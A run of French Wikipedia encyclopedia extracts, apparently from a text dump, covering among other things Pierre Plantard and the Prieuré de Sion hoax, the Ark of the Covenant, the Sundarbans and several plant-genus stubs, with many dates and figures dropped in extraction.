Enfin, dans le dernier chapitre, Péan met en lumière des informations concernant l'activité de consultant exercée par Kouchner entre 2002 et 2007 et rémunérée assez grassement. Des contrats de consultanat ont ainsi existé avec le Gabon et la République du Congo. L'auteur précise que le président de la République Nicolas Sarkozy ignorait les activités africaines de son futur ministre lors de sa nomination. Finalement, selon "Le Monde", « l'ouvrage est principalement une attaque en règle de la politique de Bernard Kouchner, sur fond de désaccord idéologique majeur exprimé par l'écrivain, en particulier sur le génocide des Tutsi au Rwanda » qui occupe en effet une partie du livre, mais pas autant que ce qui concerne les relations commerciales de Kouchner avec des dictateurs africains.
La polémique éclate, un certain nombre de personnalités taxant Pierre Péan de manière plus ou moins voilée d'antisémitisme, pour avoir utilisé les termes « cosmopolitisme » et « affairisme ». Michel-Antoine Burnier, ami et biographe de Kouchner, attaque le premier le en évoquant « des relents nauséabonds », suivi de Bernard-Henri Lévy, puis Philippe Val (sur Canal+ ou à France Inter). Le , le ministre a réagi, en utilisant la même attaque, dans "Le Nouvel Observateur", ce qui a déclenché une polémique médiatique au cours de laquelle Philippe Cohen s'émeut de cette attaque généralisée pour discréditer Péan. Le fait est que Bernard Kouchner a utilisé l'accusation d'antisémitisme en prétendant avoir été qualifié par Pierre Péan de représentant de , ce qui n'est pas dans le livre.
La presse étrangère ("The Guardian", "The Independent", "The Washington Post") se fait l'écho des accusations portées contre Bernard Kouchner.
Sur l'échiquier politique, la droite prend le parti du ministre des Affaires étrangères tandis que la gauche hésite.

</doc>
<doc id="248949" url="https://fr.wikipedia.org/wiki?curid=248949" title="Stipa (homonymie)">
Stipa (homonymie)

 
Stipa peut faire référence à :

</doc>
<doc id="248950" url="https://fr.wikipedia.org/wiki?curid=248950" title="Milium">
Milium

Milium ou millium est un mot latin qui peut désigner :

</doc>
<doc id="248960" url="https://fr.wikipedia.org/wiki?curid=248960" title="Affirmation d'une disjonction">
Affirmation d'une disjonction

Le raisonnement fallacieux de l'affirmation de la disjonction peut apparaître lors d'un syllogisme disjonctif quand un argument prend la forme :
Explication.
La faute consiste à conclure que B doit être fausse car A est vraie ; en réalité B peut également être vraie. Le véritable syllogisme disjonctif est basé sur le fait que la prémisse mineure est fausse et entraîne la véracité de la conclusion.
Si le "ou" est exclusif (C'est-à-dire s'il interdit une vérité conjointe des deux propositions »), alors le raisonnement est valide.
Exemples.
Exemple d'une affirmation fausse.
La conclusion ci-dessus est fausse car il peut y avoir du soleil et de la pluie en même temps, ou l'un à la suite de l'autre au cours de la même journée, ce ne sont pas des événements exclusifs.
Exemple d'une affirmation vraie.
En revanche le syllogisme suivant est valide :

</doc>
<doc id="248961" url="https://fr.wikipedia.org/wiki?curid=248961" title="Melica">
Melica



</doc>
<doc id="248963" url="https://fr.wikipedia.org/wiki?curid=248963" title="Sundarbans">
Sundarbans

Les Sundarbans (« "sundri" » : plante présente dans la mangrove et « "bans" » : forêt) sont une région faite d'innombrables bras et canaux du delta du Gange qui, par le Hooghly et d'autres, descendent vers le golfe du Bengale. Il s'y trouve la plus grande forêt de mangrove du monde. La région, caractéristique du Bengale, se trouve à cheval entre l'Inde et le Bangladesh. Elle a été classée patrimoine mondial de l'UNESCO dans les deux pays. Le site est également reconnu en tant que site Ramsar depuis le et réserve de biosphère depuis 2001.
Conséquence du réchauffement climatique.
Depuis , malgré la construction de digues, deux îles des Sundarbans ont disparu sous les eaux provoquant le déplacement de habitants. On prévoit que familles devront migrer d'ici à 2020, quand 15 % des terres auront disparu.
Le World Wide Fund for Nature envisage de replanter des mangroves autour des îles pour laisser passer les sédiments tout en ralentissant la montée des eaux au moment de la mousson.
Marée noire.
Le , un pétrolier de la Bangladesh Petroleum Corporation entre en collision avec un autre navire entraînant une marée noire. de pétrole se dispersent dans les lagunes, asphyxiant faune et flore.
Centrale à charbon.
L'Inde et le Bangladesh envisagent la construction d'une centrale à charbon qui se situerait à la lisière de la forêt.
Des associations écologistes mènent une campagne contre le projet : « La centrale à charbon de Rampal impliquerait le passage de millions de tonnes de charbon à travers des voies d’eau étroites, accélérant l’érosion d’un rempart majeur contre les cyclones, sans parler de la menace de pollutions de toutes sortes infligée ».

</doc>
<doc id="248966" url="https://fr.wikipedia.org/wiki?curid=248966" title="Aegilops">
Aegilops



</doc>
<doc id="248967" url="https://fr.wikipedia.org/wiki?curid=248967" title="Pierre Plantard">
Pierre Plantard

Pierre Plantard, né à Paris le et mort à Colombes (Hauts-de-Seine) le , est un dessinateur de métier et journaliste, surtout connu pour avoir longtemps tenté de démontrer sa descendance de la lignée mérovingienne.
Biographie.
Fils unique, issu d'une famille modeste avec un père travaillant comme majordome et une mère comme cuisinière, Pierre Plantard quitte l'école à . Devenu sacristain à l'église Saint-Louis-d'Antin, dans le de Paris, il milite dans diverses associations d'extrême droite, ce qui le mène à la fondation de divers groupes antijuifs tels que Rénovation nationale française ou Alpha Galates. Mais il est surtout connu pour être le co-auteur, avec Philippe de Chérisey, dans les années 1960, de documents d'archives sans preuves vérifiées connus sous le nom de "Dossiers secrets d'Henri Lobineau". Il use de toute une série de noms d'emprunt au fil de sa vie : « Varran de Verestra » ; « Pierre De France » ; « Chyren » (en référence à la prophétie de Nostradamus sur la venue d'un grand monarque) ; et, dès 1975 (date importante dans l'Affaire dite de Rennes-Le-Château), il se fait nommer « Pierre Plantard de Saint-Clair » (voir Famille Sinclair, en référence aux Templiers de la Chapelle de Rosslyn en Écosse).
Il est également connu pour être le fondateur en 1956 du Prieuré de Sion.
L’action politique.
Pierre Plantard s'essaie une vingtaine d'années en politique, à l'extrême droite de l'échiquier français. Convaincu par l’affaire Stavisky de la réalité d’un complot judéo–maçonnique mondial et, après un bref passage à l'Action française de Charles Maurras, il fonde des groupuscules antisémites : l’Union française (1937), Rénovation nationale française (1941) et Alpha Galates en 1942 (association déclarée à la Préfecture de Police de Paris), mouvement d'extrême droite qui soutient le régime de Vichy dirigé par Philippe Pétain. Son bulletin mensuel de quatre pages, "Vaincre — Pour une jeune chevalerie", n'est publié et distribué gratuitement qu'à six reprises entre et . Il y signe des articles sous le nom de « Pierre De France » ou « Pierre De France-Plantard ». Les grades de l’ordre Alpha Galates s’inspirent de l’ordre rosicrucien AMORC. 
En , Pierre Plantard se dit dirigeant de Rénovation nationale française. Le , il écrit à la Préfecture pour l’informer que son mouvement a décidé, avec « l’appui des hautes autorités allemandes, de prendre possession du local inoccupé situé au 22 place Malesherbes et loué à un juif anglais, M. Shapiro ». La permission est refusée par les autorités allemandes le .
En 1943, il écrit au Maréchal Pétain une lettre où il dénonce un complot judéo–maçonnique contre lui. 
Un rapport de police daté du 3 janvier 1943, décrit Plantard comme « un illuminé, un jeune homme prétentieux et sans grande formation intellectuelle », et, le 3 septembre 1943, la préfecture et les autorités allemandes lui interdisent toute activité. 
À la Libération, il essaie de faire passer ces organisations pour des groupes de résistance. Son dernier coup d’éclat se situe lors de la crise de mai 1958 lorsqu’il prétend être l’un des organisateurs des comités de salut public en métropole.
Des ennuis judiciaires amènent Plantard en prison de 1953 à 1954, provoquant la dissolution de son groupuscule.
L'action ésotérique.
Les pièces essentielles de cette construction ésotérique sont issues du contact que Plantard aurait eu, avant et pendant la guerre, avec le milieu synarchiste de Saint-Yves d'Alveydre, notamment par l'entremise d'Israël Monti (Marcus Vella), alias Georges Monti (1885-1936). Ce sont sans doute ces premiers éléments qui l'ont poussé, en 1947, à rassembler les papiers légaux nécessaires à la création de l'Académie latine, organisation dont le but était la recherche historique. Mais il faut réellement attendre le milieu des années cinquante pour le voir répandre, dans les cercles catholiques, une version de son histoire personnelle qui accrédite son ascendance royale, Plantard se disant descendant de Dagobert II, Mérovingien et prétendant au trône de France.
Le , il est initié en franc-maçonnerie dans le Grand Orient de France par la loge à Ambilly dont il est exclu en janvier 1954 sur décision du conseil de l'ordre.
En 1956, il fonde à Annemasse le Prieuré de Sion, dont André Bonhomme est président jusque 1973. 
Le , il en dépose les statuts à la sous-préfecture de Saint-Julien-en-Genevois. L'objectif de cette confrérie serait de rénover moralement l'Europe en réalisant l'unification du continent par la CEE et d'autres moyens plus complexes. Pour donner une preuve de ses propos, Plantard n'hésite pas, avec l'aide de son ami Phillipe de Philippe de Chérisey, à fabriquer et introduire anonymement, entre 1964 et 1967, à la Bibliothèque nationale de Paris, une série de documents sans preuves manuscrites vérifiées sous le nom des "Dossiers secrets d'Henri Lobineau" : parmi ceux-ci un document relatif au Prieuré de Sion. 
Plantard revient en prison pour une affaire de détournement de mineur en 1956, il déménage le Prieuré à Paris. Plantard se prétend à cette époque descendant du roi mérovingien Dagobert II, dernier monarque légitime de sa dynastie. Puis il récupère le mythe de Rennes-le-Château où existerait un trésor mérovingien comprenant des documents au contenu explosif. Il présente alors le Prieuré de Sion comme une société occulte défenderesse des droits des descendants des Mérovingiens ; il aurait été fondé par Godefroy de Bouillon et eu pour grands maîtres des alchimistes et occultistes célèbres. 
Le Prieuré de Sion sort de son quasi-anonymat en 1967, lorsque Plantard contacte Gérard de Sède, déjà auteur d'un livre sur l'histoire de Gisors ("Les Templiers sont parmi nous", 1962). Cette rencontre aboutit au deuxième livre de De Sède, "L'or de Rennes" (1967). Toute la fantasmagorie sur Rennes-le-Chateau et le trésor caché de l'abbé Saunière démarre alors, notamment entretenue par des « parchemins » fabriqués par Philippe de Chérisey pour ce livre, alors que l'abbé Saunière n'aurait fait que du trafic de messes, comme l'attestent ses comptes et archives consultables au diocèse de Carcassonne. De Sède et le journaliste Chaumeil dénonceront les documents de Plantard comme des faux.
En 1993, Pierre Plantard est interrogé par la justice dans le cadre de l'enquête sur la mort de Roger-Patrice Pelat, ancien ami de François Mitterrand. Plusieurs documents retrouvés chez lui le présentent comme étant le « vrai Roi de France ». .
Il reste isolé de 1993 jusqu'à sa mort, le ; l'annonce n'en est faite que le de la même année, mais en indiquant une date de décès au . Ses restes ont été incinérés.

</doc>
<doc id="248969" url="https://fr.wikipedia.org/wiki?curid=248969" title="Christian Plume">
Christian Plume

Christian Plume est un journaliste, animateur de radio et écrivain français né le à Caudéran et mort le à Saint-Lizier.
Biographie.
Descendant de sept générations d’éleveurs de chevaux et de taureaux sauvages, Christian Plume, dont la mère portait la coiffe d’Arles, est attaché à la Camargue. 
Pendant un demi-siècle, il a connu une vie consacrée à tous les métiers « "à ne pas faire" » : journaliste, cinéaste, chroniqueur de télévision et de radio et écrivain polygraphe. 
Il fut grand reporter à Paris-Presse et pigiste au "Canard enchaîné" dans les années 1960. Il publia dans ce journal une enquête de police. La réaction au "Canard enchaîné" fut très négative sur cet ouvrage. 
Il a publié des ouvrages sur les sectes, les francs-maçons ainsi que sur les grandes figures du cinéma, de la chanson et du music-hall.
Après avoir été animateur de radio sur Europe 1 et Sud Radio, il a présenté une émission consacrée à la chanson française sur RDC, radio locale de Saint-Girons, en Ariège.
Il a été aussi présentateur et narrateur de chanteurs traditionnels, voire "rétro" ou à sketches des années 1920 à 1960 notamment, sur Radio Bleue jusqu'en 1997, disques à l'appui.

</doc>
<doc id="248970" url="https://fr.wikipedia.org/wiki?curid=248970" title="Agropyron">
Agropyron

Agropyron est un genre de plantes monocotylédones de la famille des "Poaceae", originaires d'Europe et d'Asie. Certaines espèces du genre sont communément appelées chiendent.
Ce sont des plantes herbacées, vivaces par leurs rhizomes, à inflorescence en épi simple.
Le genre comprend environ 600 espèces, dont beaucoup sont des mauvaises herbes des cultures.
Phytonymie.
"Agropyrum" vient du grec "agros" champ et "pyros"blé, à cause de sa ressemblance avec les anciennes variétés de blé.
Liste des espèces.
Selon :
Selon :

</doc>
<doc id="248973" url="https://fr.wikipedia.org/wiki?curid=248973" title="Nardus">
Nardus



</doc>
<doc id="248975" url="https://fr.wikipedia.org/wiki?curid=248975" title="Nard">
Nard



</doc>
<doc id="248978" url="https://fr.wikipedia.org/wiki?curid=248978" title="Arche d'alliance">
Arche d'alliance

L'Arche d'alliance (en hébreu אֲרוֹן הָעֵדוּת, "Aron ha'Edout", « Arche du témoignage ») est une relique sacrée centrale de la tradition judaïque, mentionnée dans la Bible hébraïque comme un coffre construit selon des instructions divines données à Moïse sur le mont Sinaï. Réalisée en bois d'acacia et recouverte d'or pur à l'intérieur et à l'extérieur, l'Arche est rectangulaire et est surmontée d'un propitiatoire flanqué de deux chérubins sculptés en or, leurs ailes déployées et formant un trône symbolique pour la présence divine. L'Arche était destinée à contenir les Tables de la Loi contenant le Décalogue. Des textes du Nouveau Testament suggèrent qu'elle aurait aussi abrité d'autres objets sacrés, comme un vase contenant la manne ou le bâton d'Aaron.
Dans la Bible, l'Arche d'alliance est décrite comme un objet de pouvoir spirituel et symbolique, représentant l'alliance entre Dieu et le peuple d'Israël. Elle joue un rôle actif dans les récits de l'Exode et de la conquête de la Terre promise. Portée par des prêtres lévites à l'aide de barres en bois recouvertes d'or insérées dans des anneaux fixés à ses côtés, elle précédait les Israélites dans leurs déplacements et était associée à des événements miraculeux. Parmi les récits notables, l'Arche aurait provoqué la séparation des eaux du Jourdain, permettant au peuple d'Israël de le traverser à pied, et causé la chute des murailles de Jéricho lors d'un siège. Elle symbolisait également la présence divine lors des batailles, offrant victoire ou protection.
Après l'installation des Israélites en Terre promise, l'Arche fut déposée dans le Tabernacle, une tente sacrée, avant d'être placée dans le Temple de Salomon à Jérusalem, dans le Saint des saints. Le sort de l'Arche demeure mystérieux après la destruction du Premier Temple par les Babyloniens en 586 av. J.-C. Aucune trace historique ou archéologique certaine de l'Arche n'a été retrouvée, ce qui a donné lieu à d'innombrables théories. Certains suggèrent qu'elle aurait été soit cachée à Jérusalem avant la destruction du Temple, soit transportée en Éthiopie, soit détruite.
Étymologie du mot « arche ».
L'Arche d'alliance qu'abritent successivement le tabernacle de l'Exode puis le Saint des saints du Temple de Jérusalem se nomme en hébreu , , terme utilisé 202 fois dans 174 versets de l'Ancien Testament. Ce n’est pas le même terme que celui utilisé pour l'Arche de Noé et pour le panier de Yokébed déposant Moïse sur le Nil. Dans ce cas, le mot hébreu est , . Ces deux termes ont été traduits dans la Vulgate par un seul mot en latin, "arca", signifiant « meuble, armoire, caisse, coffre », mais aussi « sarcophage, cercueil », et qui a donné « arche » en français par confusion avec le latin "arcus", « arc, voûte ».
Récit biblique.
Description.
Selon un des récits bibliques, l'Arche d'alliance est en bois d'acacia recouverte d'or pur à l'intérieur et à l'extérieur et sur elle il y a tout autour une bordure d'or. Ses dimensions, comme demandées par Dieu à Moïse dans le livre de l'Exode 25,10-11, sont de deux coudées et demie pour sa longueur, une coudée et demie pour sa largeur, une coudée et demie pour sa hauteur. Elle a quatre pieds au-dessus desquels sont mis quatre anneaux d'or. Des barres en bois d'acacia recouvertes d'or sont passées dans les anneaux pour la porter. Un couvercle (propitiatoire) d'or pur est placé dessus. Deux chérubins en or battu sont aux deux extrémités du couvercle, ont leurs ailes déployées vers le haut, couvrant le coffre, et ont leurs faces tournées l'une vers l'autre. L'Arche d'alliance, les anneaux, les barres, le propitiatoire et les deux chérubins sont fabriqués selon ce récit, par Béséléel.
La description de l'arche se trouve dans la Bible :
Parcours.
De la sortie d'Égypte jusqu'à l'entrée des Israélites dans le pays de Canaan, l'Arche est portée par les Lévites, qui marchent à trois journées devant les autres tribus. Elle fait partie du cortège qui permet la traversée du Jourdain sous la direction de Josué puis de celui qui permet de faire tomber les murailles de Jéricho, lors de sa conquête racontée dans le Livre de Josué.
Après l'installation des Israélites dans l'Israël antique, l'Arche demeure à Guilgal, puis Silo et Kiryat-Yéarim (Premier livre de Samuel, ). Avant la traversée du Jourdain, elle est à Shittim (Abel-Shittim) située dans les plaines désertiques de Moab. Après la traversée du Jourdain, l'Arche d'alliance est à Guilgal à la limite orientale de Jéricho. Le peuple emmène l'Arche d'alliance et prend la ville de Jéricho mais est mis en échec devant la ville de Hai et Josué tombe la face contre terre devant l'Arche d'alliance. Après enquête et punition, le peuple peut s'emparer de la ville de Hai. L'Arche d'alliance est à Sichem et le peuple se tient de part et d'autre de l'Arche d'alliance, une moitié du côté du mont Garizim et l'autre moitié du côté du mont Ebal lors du renouvellement de l'alliance par Josué.
L'Arche d'alliance est à Béthel et Phinées, le petit-fils d'Aaron, est devant elle avant la guerre benjaminite. Samuel est couché dans le temple où se trouve l'Arche d'alliance à Silo. Les Philistins battent Israël et le peuple va chercher l'Arche d'alliance à Silo avec Ophni et Phinées, les deux fils du prêtre Éli. Les Philistins rebattent Israël à Eben-Ezer, et tuent Ophni et Phinées. À l'annonce de cet événement funeste, le prêtre Eli meurt.
Les Philistins emmènent l'Arche d'alliance d'Eben-Ezer à Ashdod dans le temple de Dagon, mais des malheurs frappent les Philistins qui emmènent alors l'Arche d'alliance à Gath, puis à la suite de nouveaux malheurs la transportent à Accaron. L'Arche d'alliance demeure 7 mois dans la campagne des Philistins qui décident de l'envoyer à Bethsamés en Israël. L'Arche d'alliance est déposée sur la grande pierre dans le champ de Yoshoua le Beth-Shémite. Des hommes de Bethsamés sont tués et les habitants décident d'envoyer l'Arche d'alliance sur la colline de Kiriath-Jearim près du village éponyme. Cependant, selon Christophe Lemardelé, si l’on traduit littéralement en se fondant sur l’hébreu du texte massorétique, et non sur le grec de la Septante comme le font l’ensemble des spécialistes qui lisent « colline » ("bounos"), on comprend que l'Arche fut portée jusqu'à ("gb"'), là où le futur roi Saül la retrouve en (texte massorétique) pour vaincre les Philistins.
L'Arche d'alliance demeure dans un sanctuaire sur cette colline dans la maison d'Abinadab sur la colline pendant 20 ans. Le roi David va chercher l'Arche d'alliance à Qiriath-Yéarim dans la maison d'Abinadab sur la colline, la fait transporter à l'écart dans la maison d'Obed-Edom le Guittite pendant 3 mois. Elle est enfin conduite à Jérusalem par le Roi David, dans un tabernacle. À la suite de la révolte de son fils Absalom, le roi David fuit Jérusalem et franchit l'ouadi de Qidrôn. Les prêtres Tsadoq et Abiathar emmènent l'Arche d'alliance mais le roi David demande que celle-ci soit ramenée à Jérusalem. Après la construction du premier temple, elle est placée dans le saint des saints par le roi Salomon.
L'arche s'insère ainsi dans différents récits de la Bible qui s'appréhendent dans leurs propres contextes narratifs et socio-historiques selon l'exégèse historico-critique : originellement, l'« arche de YhWh » est une sorte de palladium, statue sacrée transportable (comme les sanctuaires itinérants des nomades et les étendards de guerre assyriens) manifestant la présence divine lors des guerres israélites contre les Assyriens et les Philistins. Les migrations de l'arche dans différents sanctuaires pourraient ainsi rappeler que ceux-ci abritaient dans des villes philistines (Ashdod, Gath, Accaron, Bethsamés) l'arche prise comme butin de guerre. Ce sanctuaire mobile, consistant peut-être en deux représentations de Yhwh et de sa parèdre Ashera présents aux côtés de l'armée lors des conflits militaires, a été transformé par les récits et la théologie deutéronomistes plus tardifs (successeurs du mouvement autour du roi de Juda Josias au sein duquel se développe l'aniconisme) en « arche d'alliance », coffre conservant les deux tables de la loi qui manifeste la présence divine en tant que guide (lors de l'Exode d'Israël hors d'Égypte et la conquête de Canaan), et est porté par les Lévites. L'historiographie deutéronomiste, tout en travaillant à la légitimation du Temple de Jérusalem, témoigne de la reconnaissance par le royaume de Juda de l'importance de sanctuaires dans le royaume d'Israël (synthèse idéologique et théologique des rédacteurs bibliques au qui intègrent les traditions des ex-Israélites formant un élément majeur de la population du royaume du sud). Les textes et la théologie chronistes en font un objet liturgique porté par les kohanim (les prêtres) avec, selon les auteurs sacerdotaux, une fonction d'expiation rituelle, puisque l'« arche de témoignage » dans le Second Temple de Jérusalem est couverte d'une "kapporet", « propitiatoire » (plaque d'or posée comme un couvercle sur le coffre contenant les tables de fondation).
Avec la disparition du royaume d'Israël en 720 av. J.-C. et l'affaiblissement de l'Assyrie sous l'effet de la menace babylonienne, l'expansion du royaume de Juda est marquée par le développement du culte national et royal. La « réforme d'Ézéchias » tente de démanteler les sanctuaires unificateurs (sanctuaires frontaliers de Guilgal entre la tribu de Benjamin et celle de Juda, de Béthel, amphictyonie de Silo) puis surtout la « réforme de Josias » mettant en place une centralisation politique et religieuse, fait du temple de Jérusalem le seul sanctuaire légitime du royaume, fondé sur la vénération unique de YHVH et dans lequel est placé le coffre. Après la prise de Jérusalem par le roi de l'Empire néo-babylonien Nabuchodonosor II en 586 avant J.-C., l'arche disparaît dans les récits bibliques et elle n'est pas dans la liste des objets pris dans le temple de Salomon. L'Arche d'alliance n'est pas non plus dans la liste des objets ramenés de Babylone après l'exil. De fait, nul ne sait ce qu'il est advenu de l'Arche d'alliance après la chute du temple de Salomon : perte ? Vol ? Destruction ? Déportation comme butin de guerre ? Cette disparition a ainsi donné lieu à diverses spéculations et revendications :
Selon le Livre des Maccabées et le Livre de Jérémie.
Si l'on se limite aux textes bibliques, d'après le canon des écritures juives, il semblerait que l'Arche, après avoir résidé de nombreuses années dans le temple de Salomon, ait purement et simplement disparu.
D'après le , il n'y avait plus d'arche dans le second temple. Il trouva le saint des saints totalement vide. Toutes sortes d'hypothèses ont été émises à ce sujet : certains supposent qu'elle aurait été dissimulée par les prêtres quelque part, dans un des tunnels souterrains du Mont du Temple, ou dans un autre endroit tenu secret jusqu'au moment propice de sa réapparition, lors de la construction du Troisième Temple.
Dans le second livre des Maccabées, on trouve rapportée comme une légende que Jérémie aurait assisté ou participé au camouflage de l'arche lors de la destruction de Jérusalem au avant l'ère chrétienne. Jérémie emporte l'Arche d'alliance dans la montagne où Moise était monté avant de mourir et la dissimule dans une grotte dont il obstrue l'entrée. Moise est monté au sommet du Pisga en surplomb du côté de la face de Yeshimôn = Beth-Yeshimoth sur le mont Nébo dans la montagne d'Abarim au pays de Moab en face de Jéricho. Balaq le roi de Moab emmène Balaam au champ de Tsophim au sommet du Pisga pour observer le peuple juif avant le franchissement du Jourdain. Des investigations furent faites en 1931 par Antonia Frederick Futterer et en 1981 par Tom Crotser.
Il y avait dans cet écrit qu'averti par un oracle, le prophète se fit accompagner par la tente et l'arche, lorsqu'il se rendit à la montagne où Moïse, étant monté, contempla l'héritage de Dieu.
Arrivé là, Jérémie trouva une habitation en forme de grotte et il y introduisit la tente, l'arche, l'autel des parfums, puis il en obstrua l'entrée.
Quelques-uns de ses compagnons, étant venus ensuite pour marquer le chemin par des signes, ne purent le retrouver.
Ce qu'apprenant, Jérémie leur fit des reproches : Ce lieu sera inconnu, dit-il, jusqu'à ce que Dieu ait opéré le rassemblement de son peuple et lui ait fait miséricorde.
Alors le Seigneur manifestera de nouveau ces objets, la gloire du Seigneur apparaîtra ainsi que la Nuée, comme elle se montra au temps de Moïse et quand Salomon pria pour que le saint lieu fût glorieusement consacré.
Ce rôle attribué au prophète Jérémie dans le sauvetage de l'arche est en contradiction avec le désintérêt que le prophète marque pour l'arche puisqu'elle n'est plus nécessaire lors des temps messianiques, la présence de Dieu remplaçant les symboles visibles :
Le verset suivant ( ) suggère que de retour d'exil à Babylone, les Hébreux ont substitué à l’Arche d'alliance, désormais disparue, Jérusalem vue comme nouveau .
Selon l'Église orthodoxe éthiopienne.
Le récit de l'Arche en Éthiopie se fonde sur une épopée médiévale, le "Kebra Nagast", livre du fondant le mythe étiologique de la royauté salomonide : l'Arche aurait été offerte par Salomon à la reine Makeda de Saba à la suite d'une visite à Jérusalem. Elle aurait ensuite été dérobée et emmenée en Éthiopie par Ménélik, le fils que la reine a eu avec Salomon.
La tradition du "Kebra Nagast" affirme par ailleurs que l'Arche se trouverait toujours dans le saint des saints d'une église chrétienne située à Aksoum : l'église Sainte-Marie-de-Sion. Selon la théorie pseudo-scientifique du journaliste Graham Hancock, ce serait après avoir séjourné dans l'île Éléphantine en Égypte, puis dans une île du lac Tana en Éthiopie, qu'elle aurait été apportée à Aksoum au , lors de la christianisation du pays.
Il est possible que cette tradition vienne d'une confusion entre l'arche et son contenant : chaque église éthiopienne est construite sur le modèle du temple de Jérusalem, possédant en son centre le saint des saints, le « maqdas », salle ouverte qu'aux prêtres et possédant un coffre en bois ou en pierre, le tabot qui conserve une réplique de l'Arche. Selon le témoignage de plusieurs gardiens de la chapelle de la tablette, la relique ne serait pas l'Arche mais un tabot vénéré depuis des siècles, consistant en une grande tablette blanche qui pourrait être une sacrée.
Actuellement, elle serait conservée dans la , située dans un enclos séparé de l'église Sainte-Marie-de-Sion, sous la protection d'un gardien nommé à vie par son prédécesseur, qui est le seul autorisé à la voir et qui ne sort jamais de l'enceinte. Ni l'empereur d'Éthiopie (assassiné en 1975), ni le président de la République d'Éthiopie, ni même le chef de l'Église orthodoxe éthiopienne ne sont autorisés à la voir. La version de la tradition éthiopienne se heurte au fait que l'Arche d'alliance était encore à Jérusalem sous le règne du roi Josias.
Autres traditions.
L'Arche d'alliance et l'islam.
Selon la tradition islamique, les exégètes ont longuement écrit sur ce « coffret », qui serait une caisse en bois précieux serti d'or et contenant la copie authentique de la Torah ("at-Tawrat").
C'est sur ce critère et cette législation authentiquement divine qui devaient mettre un point final aux discussions meurtrières qui divisaient les Juifs d'époque et leur apporter ainsi la « paix » dont ils avaient tant besoin.
C'est à cette copie que le Coran fait allusion quand il demande aux Juifs d'apporter leur Livre pour voir s'il n'est pas en accord avec ce que le Coran leur dit. L'Arche d'alliance contenant le Pentateuque de Moïse (Torah) fut par la suite enlevée aux Juifs par les Philistins après une guerre meurtrière.
L'Arche d'alliance a été citée par la sourate 2 du Coran, "Al-Baqara", comme preuve du règne de Tālūt (le Saül coranique) :
Spéculations.
Selon les textes :
Selon le livre des Rois, . Ce récit de l'auteur deutéronomiste suggère que les deux tables remplacent peut-être deux pierres sacrées, comme on le trouve aussi dans des coffres bédouins pré-islamiques. Ce passage est peut-être à rapprocher de la pratique dans certaines tribus arabes de remplacer les deux déesses Al-Lat et Uzza par des copies du Coran.
Selon le , .
Selon l'Épître aux Hébreux (), .
L'absence de restes matériels a permis de donner libre cours à l'imagination. Ainsi, l'écrivain occultiste Jean Sendy écrit dans "Lune, clé de la Bible" en 1968 (en pleine période de conquête de la Lune) que l'Elohim biblique désigne des anges qui seraient des extra-terrestres ayant colonisé la Terre avant de repartir sur la Lune au moment du Déluge et où ils auraient mis à l'abri l'arche. Le , l'archéologue amateur Tom Crotser prétend avoir retrouvé l'arche dans un tunnel sous le relié à un monastère franciscain, découverte réfutée par l'archéologue Siegfried Horn. Le , l'aventurier Ron Wyatt déclare avoir retrouvé l'arche dans une cavité souterraine du site de la Tombe du jardin. Il prétend y avoir également trouvé des traces du sang du Christ. L'absence de publication et d'artefact présenté à la communauté scientifique fait que cette dernière n'accorde aucun crédit à ce qu'elle considère comme des élucubrations grotesques.
Dans la culture populaire.
Littérature.
L'Arche d'alliance est un objet de mystère historique dans le roman "La Découverte du ciel" (1992) de l'écrivain néerlandais Harry Mulisch ; elle constitue un fondement de l'intrigue. Elle est également l'objet de recherche d'un archéologue dans le roman policier "L'Arche d'Alliance" (2010) de Sarah Frydman.
Selon le journaliste Graham Hancock, l'Arche aurait été transportée vers 650 av. J.-C. à Éléphantine (île d'Égypte où existait une colonie juive qui avait son propre temple consacré à YHWH) par des Lévites pour la sauver du roi idolâtre Manassé puis sur l'île éthiopienne de , peuplée de Falachas (« juifs noirs » d'Éthiopie). Au , des prêtres l'auraient finalement amené à Aksoum en Éthiopie après la conversion des habitants au christianisme. Son livre "Le mystère de l'arche perdue" relève plus de la théorie pseudo-scientifique et de la littérature que de la recherche historique.
Cinéma.
L'Arche d'alliance est l'objet de la quête d'Indiana Jones dans le film "Les Aventuriers de l'arche perdue" (1981) de Steven Spielberg avec Harrison Ford, où le coffre en bois plaqué en or pur semble agir comme un condensateur géant libérant de l'énergie électrique, pouvant ainsi servir de transmetteur capable de communiquer directement avec Dieu (idée tirée du livre "Chariots of the Gods? Unsolved Mysteries of the Past" publié en 1968 par l'ufologue Erich von Däniken qui considère que l'Arche a été construite par des extra-terrestres pour communiquer avec Aaron et Moïse) et de tuer des personnes par décharge électrostatique. Représentée sur une paroi dans "Indiana Jones et la Dernière Croisade", l'arche réapparait lors d'un court plan dans le des aventures de l'archéologue "Indiana Jones et le royaume du crâne de cristal" lorsque la caisse qui l'abrite est endommagée à la suite d'une course-poursuite.
Dans "Le Secret des Templiers", film danois de 2006, l'arche agit telle une bouteille de Leyde qui concentre de l'énergie électrique.
Ces films font probablement référence à une interprétation exégétique du popularisée en 1915 par l'article de Nikola Tesla « The Wonder World to be Created by Electricity » qui évoque un coffre dans la Bible constituant un super-condensateur accumulant de l'électricité statique par frottement de l'air chaud du désert contre les rideaux de lin (ces rideaux pouvant correspondre à ceux séparant le Saint des saints qui abrite le coffre, du reste du temple). Cette idée d'arc électrique capable de véhiculer l'énergie universelle est reprise dans le milieu ésotérique adepte de ces théories pseudo-scientifiques pour construire des répliques de l'Arche d'alliance agissant comme un condensateur géant.
Télévision.
Dans la série télévisée "Supernatural", à l'épisode 14 de la saison 11 (""), un morceau de l'Arche d'alliance est l'un des objets qui contient la puissance de Dieu.
À la fin de la saison 1 de la série "The Order" l'Arche d'alliance apparaît.
Dans le premier téléfilm "", l'Arche d'alliance est présente dans la bibliothèque.

</doc>
<doc id="248981" url="https://fr.wikipedia.org/wiki?curid=248981" title="Valorisation Spot">
Valorisation Spot



</doc>
<doc id="248989" url="https://fr.wikipedia.org/wiki?curid=248989" title="Jean Oberlé">
Jean Oberlé

 
Jean Oberlé, né le à Brest et mort le à Paris, est un peintre et illustrateur français.
Biographie.
Jean Oberlé illustra une vingtaine d'ouvrages contemporains et travailla pour différents journaux ou magazines parisiens, dont "Le Crapouillot", de façon assez importante. Il illustre par exemple en 1924 "Le Prix Lacombyne" de Renée Dunan, dont il publie la même année un portrait dans l'hebdomadaire illustré "Le Carnet de la semaine".
Il rencontra tous ceux qui comptaient dans le Montparnasse des années 1920 (). Une profonde amitié le liait à Max Jacob, dont il peint le portrait à plusieurs reprises.
Il obtient le prix Blumenthal en 1934.
